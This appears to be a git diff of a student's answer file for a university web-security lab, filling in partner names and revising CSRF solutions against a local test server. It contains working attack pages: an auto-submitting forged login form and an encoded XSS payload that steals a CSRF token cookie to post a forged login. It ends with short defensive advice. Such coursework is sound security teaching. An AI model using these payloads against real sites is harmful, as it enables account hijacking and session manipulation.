@@ -8,7 +8,7 @@ Only one person partnership needs to submit.
 Reminder: You may NOT work with the same partner on multiple assignments.
 
 
-NAMES: [Full Names of both partners]
+NAMES: [Bao P Nguyen and Xi Jiang]
 
 ________________________________________________________________________________________
 
@@ -60,31 +60,28 @@ ________________________________________________________________________________
 Part 2: Cross-site Request Forgery (CSRF)
 
 	2.0) No defense. Target URL: http://0.0.0.0:8080/login?csrfdefense=0&xssdefense=4
-
-		<html>
+        <html>
             <head>
                 <title>Safe site</title>
             </head>
-		   <body>
+            <body>
                 <form action="http://0.0.0.0:8080/login?csrfdefense=0&xssdefense=4" method="POST">
-                    <input id="username" name="username" type="text" value="attacker" required >
-                    <input id="userpass" name="password" type="password" value="URpwn3d" required >
+                    <input name="username" value="attacker">
+                    <input name="password" value="URpwn3d" >
                 </form>
-                <script>
-                    document.forms[0].submit();
-                </script>
-           </body>
+                    <script>
+                        document.forms[0].submit();
+                    </script>
+            </body>
         </html>
-
 
 	2.1) Token validation (with XSS). Target URL: http://0.0.0.0:8080/login?csrfdefense=1&xssdefense=0
         <html>
             <head>
                 <title>Safe site</title>
-                <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
             </head>
             <script type="text/javascript">
-                document.addEventListener("DOMContentLoaded", function(){var url = "http://0.0.0.0:8080/search?q=%3Cscript%3E+document.addEventListener%28%22DOMContentLoaded%22%2C+function+%28%29%7B+var+token+%3D+Cookies.get%28%22csrf_token%22%29%3B++%24.post%28%22http%3A%2F%2F0.0.0.0%3A8080%2Flogin%3Fcsrfdefense%3D0%26xssdefense%3D4%22%2C+%7Busername%3A+%22attacker%22%2C+password%3A+%22URpwn3d%22%2C+csrf_token%3A+token%7D%29%3B%7D%29%3B+%3C%2Fscript%3E+";
+                document.addEventListener("DOMContentLoaded", function(){var url = "http://0.0.0.0:8080/search?q=%3Cscript%3E+document.addEventListener%28%22DOMContentLoaded%22%2C+function+%28%29%7B+var+token+%3D+Cookies.get%28%22csrf_token%22%29%3B+%24.post%28%22http%3A%2F%2F0.0.0.0%3A8080%2Flogin%3Fcsrfdefense%3D1%26xssdefense%3D0+%22%2C+%7Busername%3A+%22attacker%22%2C+password%3A+%22URpwn3d%22%2C+csrf_token%3A+token%7D%29%3B%7D%29%3B+%3C%2Fscript%3E";
         window.location.href=url; },false);
             </script>
         </html>
@@ -156,7 +153,7 @@ Part 4: Better Defenses
 	4.4) In 1-2 paragraphs, provide some advice to the Bunglers about how they should
 	     strengthen Bungle!'s defenses to prevent CSRF attacks
 
-        So in our exercises, when there is no XSS defense and no CSRF token required, the attack happens because the attacker could trick the user into clicking a link that would perform a post request to the log in site with the username/password controlled by the attacker. This makes the user vulnerable because the attacker can observe their behaviors. When there is CSRF token and no XSS defense, the attacker could take advantage of the XSS vulnerability to extract the CSRF token and make
+        So in our exercises, when there is XSS defense and no CSRF token required, the attack happens because the attacker could trick the user into clicking a link that would perform a post request to the log in site with the username/password controlled by the attacker. This makes the user vulnerable because the attacker can observe their behaviors. When there is CSRF token and no XSS defense, the attacker could take advantage of the XSS vulnerability to extract the CSRF token and make
         the user log in. The Bunglers should enable XSS defense (sanitizing recursively tags, scripts, characters such as <, >, ; , ', ",...). This should limit the attackers' exploit of XSS vulnerability. Secondly, The Bunglers should enable CSRF token. With these 2 defenses in place, CSRF attacks are limited.
 
 ________________________________________________________________________________________
